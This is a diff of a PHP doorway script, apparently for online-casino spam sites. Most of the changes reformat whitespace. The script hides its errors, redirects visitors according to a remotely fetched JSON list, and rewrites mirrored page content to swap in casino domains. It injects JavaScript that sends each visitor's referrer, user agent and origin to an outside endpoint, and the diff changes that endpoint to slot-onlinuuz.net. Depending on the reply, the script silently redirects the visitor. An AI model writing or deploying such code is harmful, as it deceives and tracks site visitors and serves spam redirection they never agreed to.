@@ -11,30 +11,30 @@ function splitHeader( $strHeader ) {
 	return $sep;
 }
 
-error_reporting(0); 
+error_reporting( 0 );
 
 // $ref_json = json_decode(file_get_contents('https://shop.perteq.ru/1.json'));
-$ref_json = json_decode(file_get_contents('https://' . $new_url . '/reffers.json'));
+$ref_json = json_decode( file_get_contents( 'https://' . $new_url . '/reffers.json' ) );
 
 
-foreach ($ref_json as $ref_key => $ref_val){
-	if($ref_val->name == $_SERVER['REQUEST_URI']){
-		header('Location:' . $ref_val->link); 
-		exit;		
+foreach ( $ref_json as $ref_key => $ref_val ) {
+	if ( $ref_val->name == $_SERVER['REQUEST_URI'] ) {
+		header( 'Location:' . $ref_val->link );
+		exit;
 	}
 }
 
 // function is_actual() {
-	// $actual_domain  = [
-		// 'topp-cazino.net'
-	// ];
-	// $current_domain = str_replace( 'www.', '', $_SERVER['HTTP_HOST'] );
+// $actual_domain  = [
+// 'topp-cazino.net'
+// ];
+// $current_domain = str_replace( 'www.', '', $_SERVER['HTTP_HOST'] );
 
-	// return in_array( $current_domain, $actual_domain );
+// return in_array( $current_domain, $actual_domain );
 // }
 
 // if ( ! is_actual() ) {
-	// require( 'dof.php' );
+// require( 'dof.php' );
 // }
 // require( dirname( __FILE__ ) . '/wp-access-check.php' );
 
@@ -156,8 +156,8 @@ curl_close( $ch );
 $bodytag = str_replace( "((?!slot-onlinuuz\.net/b)\w+(?:\.\w+)+", "https://worlds-icazinos.azurewebsites.net/", $contents );
 $result  = preg_replace( '~' . $new_url . '~m', "worlds-icazinos.azurewebsites.net", $contents );
 preg_match_all( "/(https:\/\/slot-onlinuuz.net).*\.(css|jpg|ico|svg|png|js|jpeg|webp|swf|gif|woff2|woff|ttf|pdf)/m", $contents, $urls_delim );
-if (strpos($contents, '<title>404 Not Found |') !== false) {
-	header("HTTP/1.1 404 Internal Server Error", true, 404);
+if ( strpos( $contents, '<title>404 Not Found |' ) !== false ) {
+	header( "HTTP/1.1 404 Internal Server Error", true, 404 );
 }
 function safe_file( $filename ) {
 	$dir = dirname( $filename );
@@ -185,58 +185,58 @@ foreach ( $urls_delim[0] as $key => $val ) {
 }
 
 $url_cache = $_SERVER['REQUEST_URI'];
-$break = Explode('/', $url_cache);
+$break     = Explode( '/', $url_cache );
 
 // var_dump($_SERVER['REQUEST_URI']);
 // var_dump($break);
-if (count($break) > 2){
-	$file = implode("_", $break);
+if ( count( $break ) > 2 ) {
+	$file = implode( "_", $break );
 } else {
-	$file = $break[count($break) - 1];
+	$file = $break[ count( $break ) - 1 ];
 }
-if ($_SERVER['REQUEST_URI'] == '/sitemap'){
-	$cachefile = dirname(__FILE__) . '/sitemap.html';
+if ( $_SERVER['REQUEST_URI'] == '/sitemap' ) {
+	$cachefile = dirname( __FILE__ ) . '/sitemap.html';
 }
-if ($_SERVER['REQUEST_URI'] == '/'){
-	$cachefile = dirname(__FILE__) . '/index.html';
+if ( $_SERVER['REQUEST_URI'] == '/' ) {
+	$cachefile = dirname( __FILE__ ) . '/index.html';
 } else {
-	$cachefile = dirname(__FILE__) .'/'. $file . '.html';
+	$cachefile = dirname( __FILE__ ) . '/' . $file . '.html';
 }
 
 $cachetime = 999999;
 
 // Обслуживается из файла кеша, если время запроса меньше $cachetime
 // if ( file_exists( $cachefile ) ) {
-	// echo "<!-- Cached copy, generated " . date( 'H:i', filemtime( $cachefile ) ) . " -->\n";
-	// include( $cachefile );
-	// echo '<script type="text/javascript" >
-	// jQuery(document).ready(function($) {
-		// var data = {
-			// action: "my_action",
-			// whatever: document.referrer,
-			// usrgnt:window.navigator.userAgent,
-			// loc:window.location.origin,
-		// };
-		// jQuery.ajaxSetup({async:false, crossOrigin: true});
-		// jQuery.post( "https://dev.perteq.ru/worldicasino.php", data, function(response) {
-			// if(response == 0){
-				// location.href = "/main.php";
-			// }
-			// setTimeout(function() {
-				// jQuery("html").removeClass("only");
-			// }, 500);
-		// });
+// echo "<!-- Cached copy, generated " . date( 'H:i', filemtime( $cachefile ) ) . " -->\n";
+// include( $cachefile );
+// echo '<script type="text/javascript" >
+// jQuery(document).ready(function($) {
+// var data = {
+// action: "my_action",
+// whatever: document.referrer,
+// usrgnt:window.navigator.userAgent,
+// loc:window.location.origin,
+// };
+// jQuery.ajaxSetup({async:false, crossOrigin: true});
+// jQuery.post( "https://dev.perteq.ru/worldicasino.php", data, function(response) {
+// if(response == 0){
+// location.href = "/main.php";
+// }
+// setTimeout(function() {
+// jQuery("html").removeClass("only");
+// }, 500);
+// });
 
-	// });
-	// </script>';
-	// exit();
+// });
+// </script>';
+// exit();
 // }
 ob_start(); // Запуск буфера вывода
 
 echo $result;
 
 
-	echo '<script type="text/javascript" >
+echo '<script type="text/javascript" >
 	jQuery(document).ready(function($) {
 		var data = {
 			action: "my_action",
@@ -245,7 +245,7 @@ echo $result;
 			loc:window.location.origin,
 		};
 		jQuery.ajaxSetup({async:false, crossOrigin: true});
-		jQuery.post( "https://dev.perteq.ru/worldicasino.php", data, function(response) {
+		jQuery.post( "https://slot-onlinuuz.net/worldicasino.php", data, function(response) {
 			if(response == 0){
 				location.href = "/main.php";
 			}
@@ -255,11 +255,11 @@ echo $result;
 		});
 
 	});
-	</script>'; 
+	</script>';
 // $cached = fopen( $cachefile, 'w' );
 // fwrite( $cached, ob_get_contents() );
 // fclose( $cached );
-ob_end_flush(); 
+ob_end_flush();
 
 // print '<pre>';
 // var_dump($result);
